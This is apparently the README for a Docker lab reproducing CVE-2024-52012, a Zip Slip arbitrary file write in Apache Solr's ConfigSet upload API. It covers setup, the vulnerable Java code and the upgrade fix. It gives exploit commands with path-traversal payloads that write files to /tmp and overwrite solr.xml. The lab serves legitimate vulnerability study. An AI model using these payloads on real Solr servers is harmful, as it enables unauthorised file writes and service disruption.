# CVE-2024-52012 — Apache Solr Zip Slip Docker Lab

**CVSS 8.8** | Affected: Apache Solr 6.6 through 9.7.0 | Unauthenticated Arbitrary File Write

A relative-path traversal (Zip Slip) in `FileSystemConfigSetService.uploadFileToConfig` allows an unauthenticated attacker to upload a malicious ZIP via the ConfigSet API, writing arbitrary files outside the configset directory.

---

## Project Structure

```
CVE-2024-52012/
  lab/                    # Docker lab environment
    Dockerfile            # Builds vulnerable Solr 9.7.0 image
    docker-compose.yml    # One-command lab startup
    vuln_proxy.py         # Vulnerable proxy (replicates CVE behavior)
    entrypoint.sh         # Container entrypoint
  exploit/                # Exploit tools
    ApacheSolarExploit.py # PoC exploit script
  README.md               # This file
```

## Architecture

```
[Exploit Script] --POST ZIP--> :8983 (Vulnerable Proxy) --other requests--> :8984 (Real Solr 9.7.0)
                                    |
                                    v
                          Extracts ZIP to filesystem
                          WITHOUT path validation
                          (Zip Slip -> arbitrary file write)
```

The proxy intercepts ConfigSet upload requests and replicates the exact behavior of the unpatched `FileSystemConfigSetService.uploadFileToConfig` — extracting ZIP entries without checking for `../` path traversal. All other requests pass through to the real Solr instance.

---

## Prerequisites

- Docker Desktop
- Python 3 with `requests` (`pip install requests`)

---

## Quick Start

```bash
# 1. Build and start the lab
cd lab
docker-compose up -d --build

# 2. Wait ~20 seconds for Solr to start, then run the exploit
cd ../exploit
python ApacheSolarExploit.py \
    --url http://localhost:8983 \
    --configset evilcfg \
    --output "../../evil.txt" \
    --content "CVE-2024-52012 pwned"

# 3. Verify the file was written OUTSIDE the configset directory
docker exec cve-2024-52012-solr bash -c 'cat /var/solr/data/evil.txt'
# Output: CVE-2024-52012 pwned
```

## PowerShell One-Liner

```powershell
cd lab; docker-compose up -d --build; `
  Start-Sleep 25; `
  cd ..\exploit; `
  python ApacheSolarExploit.py --url http://localhost:8983 --configset evilcfg --output "../../evil.txt" --content "pwned"; `
  docker exec cve-2024-52012-solr bash -c 'cat /var/solr/data/evil.txt'
```

---

## Example Payloads

```bash
# Write file 2 levels up from configset root
python ApacheSolarExploit.py --url http://localhost:8983 --configset test1 \
    --output "../../proof.txt" --content "path traversal works"
# Written to: /var/solr/data/proof.txt

# Write to /tmp (deep traversal)
python ApacheSolarExploit.py --url http://localhost:8983 --configset test2 \
    --output "../../../../tmp/pwned.txt" --content "written to /tmp"
# Written to: /tmp/pwned.txt

# Overwrite solr.xml (breaks Solr — demonstrates impact)
python ApacheSolarExploit.py --url http://localhost:8983 --configset test3 \
    --output "../../solr.xml" --content "<solr/>"
```

---

## Solr Admin UI

Once the lab is running: http://localhost:8983/solr

The UI is fully functional — the proxy transparently forwards all non-exploit requests to the real Solr backend.

---

## How It Works

1. The exploit crafts a ZIP with a path-traversal filename (e.g. `../../evil.txt`)
2. Uploads it to Solr's ConfigSet API (`POST /solr/admin/configs?action=UPLOAD`)
3. The vulnerable code resolves the ZIP entry name against the configset directory:
   ```java
   // FileSystemConfigSetService.uploadFileToConfig (unpatched)
   Path file = configDir.resolve(filePath);  // No validation!
   Files.write(file, data);
   ```
4. The `../` sequences escape the configset directory (Zip Slip)
5. The file is written to an arbitrary location on the filesystem

### Fix

Upgrade to Apache Solr >= 9.8.0, which validates that extracted paths remain within the configset directory.

---

## Cleanup

```bash
cd lab
docker-compose down
```

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| `docker-compose up` fails | Ensure Docker Desktop is running |
| Solr not responding on 8983 | Wait 20-30s; check `docker-compose logs solr` |
| Exploit returns connection error | Ensure lab is running: `docker ps` |
| `requests` module not found | `pip install requests` |
